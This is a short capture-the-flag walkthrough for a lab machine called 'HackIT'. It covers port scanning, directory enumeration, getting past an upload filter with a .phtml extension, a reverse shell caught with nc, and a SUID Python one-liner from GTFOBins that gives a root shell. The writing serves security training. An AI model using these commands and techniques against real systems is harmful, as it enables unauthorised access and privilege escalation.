Starting with initial recon, 

> nmap -sV -sC -oN nmap_scan 10.10.191.173        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-21 09:17 IST
Nmap scan report for 10.10.191.173
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Browsing to port 80 reveals nothing but a simple web page. Trying directrory enumeration with dirsearch reveals few interesting directories, 
```
[09:20:02] 301 -  316B  - /uploads  ->  http://10.10.191.173/uploads/      
[09:20:06] 301 -  312B  - /css  ->  http://10.10.191.173/css/              
[09:20:10] 301 -  311B  - /js  ->  http://10.10.191.173/js/                
[09:20:44] 301 -  314B  - /panel  ->  http://10.10.191.173/panel/
```
/panel allows file uploads and /uploads exposes uploads directory on web server.

Uploading.php file did not work, tried bruteforcing extension and found .phtml is allowed.

After uploading the reverse shell in /panel, spawn a nc listener depending on the listening port specified, then browse to your file on /uploads directory to spawn a reverse shell.

We get access to first flag there.

Then after to enumering and finding nothing useful, tried searching for SUID bit set files with,

> find / -perm -u=s -type f 2>/dev/null
reveals /usr/bin/python has SUID bit set. Browsing to GTFO bins to find its exploit gives this information,

sudo install -m =xs $(which python) .
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

By following that we get root access,
$ python -c 'import os; os.execl("/bin/sh",  "sh", "-p")'
whoami
root

By  browsing to /root/root.txt we get the final flag!
